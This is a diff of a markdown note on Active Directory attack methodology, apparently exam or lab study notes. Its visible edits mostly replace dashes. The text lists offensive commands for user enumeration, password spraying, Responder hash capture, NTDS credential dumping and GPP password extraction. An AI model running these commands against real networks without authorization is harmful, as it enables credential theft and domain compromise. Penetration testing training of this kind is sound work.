@@ -1,12 +1,12 @@
 # AD Attack Methodology
 
-> The AD set is worth 40 points. Follow this progression — each phase unlocks the next.
+> The AD set is worth 40 points. Follow this progression - each phase open the next.
 
 ## Phase 1: No Credentials
 
 > **CRITICAL: Check for web apps on EVERY AD machine first.** Many AD sets start with a web app that gives you initial creds or a foothold. Don't tunnel-vision on SMB/LDAP.
 
-0. **Enumerate ALL services on ALL AD machines** — not just the DC
+0. **Enumerate ALL services on ALL AD machines** - not just the DC
 ```bash
 nmap -sC -sV -p- -oA nmap/ad-machines $IP1 $IP2 $DC
 ```
@@ -47,7 +47,7 @@ kerbrute userenum -d domain.local --dc $DC users.txt
 7. **Password spray discovered users**
 → [[Password-Spraying]]
 
-8. **Responder** (catch forced/coerced authentication — NOT poisoning)
+8. **Responder** (catch forced/coerced authentication - NOT poisoning)
 ```bash
 # Start listener to catch NTLMv2 hashes from forced auth
 sudo responder -I tun0
@@ -69,7 +69,7 @@ nxc smb $DC -u user -p password
 nxc smb $DC -u user -p password --shares
 ```
 
-3. **BloodHound collection** — do this EARLY
+3. **BloodHound collection** - do this EARLY
 → [[BloodHound]]
 
 4. **Kerberoasting**
@@ -154,13 +154,13 @@ type C:\Users\Administrator\Desktop\proof.txt
 
 ## Key Reminders
 
-- **Always spray** discovered passwords across ALL machines — EVERY password on EVERY service
-- **Check description fields** in LDAP — passwords live there ~50% of the time
+- **Always spray** discovered passwords across ALL machines - EVERY password on EVERY service
+- **Check description fields** in LDAP - passwords live there ~50% of the time
 - **Credential reuse** is your best friend in AD
-- **Run BloodHound early** — it shows paths you'd never find manually
+- **Run BloodHound early** - it shows paths you'd never find manually
 - **Mark owned users** in BloodHound after every new compromise
 - **Don't forget NTDS dump** on the DC: `nxc smb $DC -u admin -p pass --ntds`
 - **Check GPP passwords**: `nxc smb $DC -u user -p pass -M gpp_autologin` and `nxc smb $DC -u user -p pass -M gpp_password`
 - **Check for constrained delegation**: `impacket-findDelegation domain.local/user:REDACTED -dc-ip $DC`
-- **Web apps on AD machines are footholds** — don't skip HTTP enumeration on client machines
+- **Web apps on AD machines are footholds** - don't skip HTTP enumeration on client machines
 - **Special characters in passwords**: escape them in bash: `'P@ss!word'` (single quotes) or `P@ss\!word`
